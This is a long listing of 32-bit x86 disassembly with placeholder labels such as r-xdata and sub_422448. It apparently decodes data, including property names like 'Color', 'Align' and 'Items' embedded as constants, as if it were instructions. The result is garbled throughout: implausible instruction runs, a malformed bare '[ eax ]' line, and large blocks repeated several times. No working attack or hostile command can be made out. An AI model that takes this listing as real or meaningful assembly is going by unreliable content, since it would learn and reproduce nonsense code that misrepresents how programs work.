imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov eax eax
cmp [ ebx ] ch
inc ebx
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
test [ ebx ] dh
jb r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
xor ah 0xff
imul ebp [ edi + 0x6e ] sub_422448
jo r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
pop [ eax + eax - 0x20 ]
insb
jae r-xdata
add [ ecx * 4 + 0x474c0041 ] dl
inc ebx
add [ esp + eax * 4 + 0x44 ] dl
add [ eax + 0x47 ] ah
inc ebx
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
outsd
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ edx ] ch
inc ebx
add [ edx + edx * 8 + 0xb0043 ] ah
or [ ebp + 0x78 ] al
je r-xdata
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 + 0x474c0041 ] dl
inc ebx
add [ esp + eax * 4 + 0x44 ] dl
add [ eax + 0x47 ] ah
inc ebx
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax + 0x44 ] ah
inc ebx
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x63bffbc ] ch
inc ebx
add al bl
mov esi 0xcc780044
inc esp
add [ eax ] ah
cli
inc ebx
add [ eax - 0x37 ] ah
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x2c ] 0xc0004515
or [ ebp ] eax
push 0x580044f4
test [ eax + eax + 0x30 ] 0xc80043fa
dec ecx
inc ebx
add [ 0xeb00c00 ] al
mov al 0x5
add ch bh
push [ esi + 0x434960ff ]
add [ eax - 0x4bffbcb7 ] ah
dec ecx
inc ebx
add ah cl
dec ecx
inc ebx
add [ eax * 2 + 0x54110043 ] bh
inc ebx
jne r-xdata
inc esp
jb r-xdata
add bh bh
dec esp
xchg ecx eax
inc esp
add [ eax - 0x6f ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ ecx ] ah
add bh bh
fadd [ edx - 0x7c8bffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ edi + esi ] dh
inc esp
add [ ebx ] bl
add bh bh
cwde
test [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
fdivr [ esi ]
inc esp
xor [ eax ] al
fdiv [ eax ]
inc eax
add al dh
inc esp
inc ebx
add al dh
add al [ ebp ]
sbb bl cl
inc esp
rol [ eax + eax - 0x40 ] cl
je r-xdata
xor [ eax ] al
fdiv [ eax ]
inc eax
add al dh
inc esp
inc ebx
add al dh
rol [ eax + eax - 0x40 ] cl
sub [ si + 0x44 ] al
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x30 ] bp
sub al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx ] ch
inc ebx
adc [ eax ] al
sbb al 0x2
add bh bh
les eax [ edi + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
cwde
push edi
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add [ eax + 0x44 ] ah
inc ebx
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x63bffbc ] ch
inc ebx
add al bl
mov esi 0xcc780044
inc esp
add [ eax ] ah
cli
inc ebx
add [ eax - 0x37 ] ah
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x2c ] 0xc0004515
or [ ebp ] eax
push 0x580044f4
test [ eax + eax + 0x30 ] 0xc80043fa
dec ecx
inc ebx
add [ ebx ] cl
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov [ ebx + eax * 2 ] gs
add [ edi ] al
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
lodsb [ esi ]
sub eax [ ebx ]
xor al 0x2b
inc ebx
add [ edi ] ch
add [ eax ] cl
inc ebp
js r-xdata
inc edx
add [ eax - 0x23ffbdef ] ah
adc al 0x42
insb
jae r-xdata
add [ gs : eax ] dl
xor eax [ esp + ebx + 0x37 ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jae r-xdata
scasd [ edi ]
add dh bh
rcl [ eax + 0x44 ] 0x1
add [ eax - 0x80000000 ] al
or eax 0x69420800
inc esp
imul ecx [ ebp + 0x6f ] 0x3e846564
inc esp
add [ edi + ecx * 4 - 0x7023ffbc ] ch
inc esp
add al ah
add [ ebx + ebp + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx + eax * 2 ] gs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp + 0x43 ] bh
add [ eax ] ch
add al [ eax ]
add ah ah
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
je r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ eax ]
stc
inc esp
add [ ecx + edi * 8 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
jmp [ eax - 0x4fffbb70 ]
jae r-xdata
add bh bh
mov al [ 0xffffffffb0004490 ]
nop
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ 0x6d657449 ] al
jae r-xdata
adc [ eax ] al
sbb [ edx ] al
add bh bh
cld
inc edi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
call 0x68437051
add [ eax ] al
add dh bh
add [ eax + 0x44 ] dh
add [ eax + 0x1 ] al
aas
inc esp
add [ eax + eax ] dh
sub_432910
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
inc edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
test [ ebx ] dh
jb r-xdata
je r-xdata
inc eax
inc eax
inc esp
add al ah
add [ eax ] al
jmp eax
test [ ebx ] dh
inc eax
add [ eax - 0x2d ] dl
je r-xdata
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 + 0x474c0041 ] dl
inc ebx
add [ esp + eax * 4 + 0x44 ] dl
add [ eax + 0x47 ] ah
inc ebx
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax + 0x44 ] ah
inc ebx
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x63bffbc ] ch
inc ebx
add al bl
mov esi 0xcc780044
inc esp
add [ eax ] ah
cli
inc ebx
add [ eax - 0x37 ] ah
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x2c ] 0xc0004515
or [ ebp ] eax
push 0x580044f4
test [ eax + eax + 0x30 ] 0xc80043fa
dec ecx
inc ebx
add [ 0xeb00c00 ] al
mov al 0x5
add ch bh
push [ esi + 0x434960ff ]
add [ eax - 0x4bffbcb7 ] ah
dec ecx
inc ebx
add ah cl
dec ecx
inc ebx
add [ eax * 2 + 0x54110043 ] bh
inc ebx
jne r-xdata
inc esp
jb r-xdata
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub eax [ ebx ]
and [ ebx ] ch
inc ebx
add [ edx + eax ] ah
add [ eax ] al
pushad
rol [ ebx ] 0x1
mov esp 0x7c004214
xor eax [ eax ]
cld
jb r-xdata
fmul [ edi - 0x501fffbc ]
inc ebx
je r-xdata
inc esp
add al al
inc edx
add [ ebx + esi - 0x2cafffc0 ] al
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov eax eax
cmp [ ebx ] ch
inc ebx
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
xor [ eax ] al
fdiv [ eax ]
inc eax
add al dh
inc esp
inc ebx
add al dh
rol [ eax + eax - 0x40 ] cl
sub [ si + 0x44 ] al
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x30 ] bp
sub al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx ] ch
or eax 0x33840042
add [ eax - 0x2f ] ah
inc ebx
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
inc esp
outsd
arpl [ ebx - 0x74 ] bp
add [ eax ] al
add [ eax ] al
xor ah 0xff
imul ebp [ edi + 0x6e ] sub_422448
jo r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
pop [ eax + eax - 0x20 ]
insb
jae r-xdata
add [ ecx * 4 + 0x474c0041 ] dl
inc ebx
add [ esp + eax * 4 + 0x44 ] dl
add [ eax + 0x47 ] ah
inc ebx
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
outsd
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ edx ] ch
inc ebx
add [ edx + edx * 8 + 0xb0043 ] ah
or [ ebp + 0x78 ] al
je r-xdata
add bh bh
dec esp
xchg ecx eax
inc esp
add [ eax - 0x6f ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ ecx ] ah
add bh bh
fadd [ edx - 0x7c8bffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ edi + esi ] dh
inc esp
add [ ebx ] bl
add bh bh
cwde
test [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
fdivr [ esi ]
inc esp
xor [ eax ] al
fdiv [ eax ]
inc eax
add al dh
inc esp
inc ebx
add al dh
add al [ ebp ]
sbb bl cl
inc esp
rol [ eax + eax - 0x40 ] cl
je r-xdata
inc ebx
adc [ eax ] al
sbb al 0x2
add bh bh
les eax [ edi + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
cwde
push edi
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add [ eax + 0x44 ] ah
inc ebx
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x63bffbc ] ch
inc ebx
add al bl
mov esi 0xcc780044
inc esp
add [ eax ] ah
cli
inc ebx
add [ eax - 0x37 ] ah
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x2c ] 0xc0004515
or [ ebp ] eax
push 0x580044f4
test [ eax + eax + 0x30 ] 0xc80043fa
dec ecx
inc ebx
add [ ebx ] cl
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov [ ebx + eax * 2 ] gs
add [ edi ] al
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
lodsb [ esi ]
sub eax [ ebx ]
xor al 0x2b
inc ebx
add [ edi ] ch
add [ eax ] cl
inc ebp
js r-xdata
inc edx
add [ eax - 0x23ffbdef ] ah
adc al 0x42
insb
jae r-xdata
add [ gs : eax ] dl
xor eax [ esp + ebx + 0x37 ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jae r-xdata
scasd [ edi ]
add dh bh
rcl [ eax + 0x44 ] 0x1
add [ eax - 0x80000000 ] al
or eax 0x69420800
inc esp
imul ecx [ ebp + 0x6f ] 0x3e846564
inc esp
add [ edi + ecx * 4 - 0x7023ffbc ] ch
inc esp
add al ah
add [ ebx + ebp + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx + eax * 2 ] gs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp + 0x43 ] bh
add [ eax ] ch
add al [ eax ]
add ah ah
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
je r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ eax ]
stc
inc esp
add [ ecx + edi * 8 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
jmp [ eax - 0x4fffbb70 ]
jae r-xdata
add bh bh
mov al [ 0xffffffffb0004490 ]
nop
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ 0x6d657449 ] al
jae r-xdata
adc [ eax ] al
sbb [ edx ] al
add bh bh
cld
inc edi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
call 0x68437051
add [ eax ] al
add dh bh
add [ eax + 0x44 ] dh
add [ eax + 0x1 ] al
aas
inc esp
add [ eax + eax ] dh
sub_432b89
sub [ ebx ] eax
mov esp 0x7c004214
xor eax [ eax ]
cld
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al dh
inc esp
inc ebx
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 + 0x474c0041 ] dl
inc ebx
add [ esp + eax * 4 + 0x44 ] dl
add [ eax + 0x47 ] ah
inc ebx
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax + 0x44 ] ah
inc ebx
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x63bffbc ] ch
inc ebx
add al bl
mov esi 0xcc780044
inc esp
add [ eax ] ah
cli
inc ebx
add [ eax - 0x37 ] ah
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x2c ] 0xc0004515
or [ ebp ] eax
push 0x580044f4
test [ eax + eax + 0x30 ] 0xc80043fa
dec ecx
inc ebx
add [ ebx ] cl
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov [ ebx + eax * 2 ] gs
add [ edi ] al
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
lodsb [ esi ]
sub eax [ ebx ]
xor al 0x2b
inc ebx
add [ edi ] ch
add [ eax ] cl
inc ebp
js r-xdata
fmul [ edi - 0x501fffbc ]
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
xor ah 0xff
imul ebp [ edi + 0x6e ] sub_422448
jo r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
pop [ eax + eax - 0x20 ]
insb
jae r-xdata
add bh bh
dec esp
xchg ecx eax
inc esp
add [ eax - 0x6f ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ ecx ] ah
add bh bh
fadd [ edx - 0x7c8bffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ edi + esi ] dh
inc esp
add [ ebx ] bl
add bh bh
cwde
test [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
fdivr [ esi ]
inc esp
inc ebx
adc [ eax ] al
sbb al 0x2
add bh bh
les eax [ edi + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
cwde
push edi
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add [ gs : eax ] dl
xor eax [ esp + ebx + 0x37 ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jae r-xdata
scasd [ edi ]
add dh bh
rcl [ eax + 0x44 ] 0x1
add [ eax - 0x80000000 ] al
or eax 0x69420800
inc esp
imul ecx [ ebp + 0x6f ] 0x3e846564
inc esp
add [ edi + ecx * 4 - 0x7023ffbc ] ch
inc esp
add al ah
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
je r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ eax ]
stc
inc esp
add [ ecx + edi * 8 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
jmp [ eax - 0x4fffbb70 ]
jae r-xdata
add bh bh
mov al [ 0xffffffffb0004490 ]
nop
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ 0x6d657449 ] al
jae r-xdata
adc [ eax ] al
sbb [ edx ] al
add bh bh
cld
inc edi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
call 0x68437051
add [ eax ] al
add dh bh
add [ eax + 0x44 ] dh
add [ eax + 0x1 ] al
aas
inc esp
add [ eax + eax ] dh
sub_432e5a
call [ edi ]
add [ ecx ] cl
dec ecx
je r-xdata
add [ esi ] cl
insd
dec ecx
outsb
js r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
push ss
add [ esi + eax * 2 ] al
outsd
outsb
je r-xdata
inc ecx
add [ edx + eax ] dl
add bh bh
js r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
mov eax 0xbc004509
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ 0x6d657449 ] al
adc [ eax ] al
sbb [ edx ] al
add bh bh
cld
inc edi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push eax
popad
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050018 ] al
je r-xdata
int3
jo r-xdata
push cs
je r-xdata
push eax
popad
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ esi ] cl
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
je r-xdata
add dh bh
add [ eax + 0x44 ] dh
add [ eax + 0x1 ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
call 0x68437051
add [ eax ] al
jmp [ eax - 0x4fffbb70 ]
aas
inc esp
add [ eax + eax ] dh
add [ eax ] al
sbb eax [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
add [ eax ] eax
jae r-xdata
insd
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edx + edi * 8 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsb
je r-xdata
jo r-xdata
outsd
push ds
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
fcom [ eax + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax - 0x80000000 ] al
and [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500b00
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
adc [ eax ] al
push edi
add [ eax ] al
dec esp
mov es [ eax + eax + 0x60 ]
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0xe0656c62
pop eax
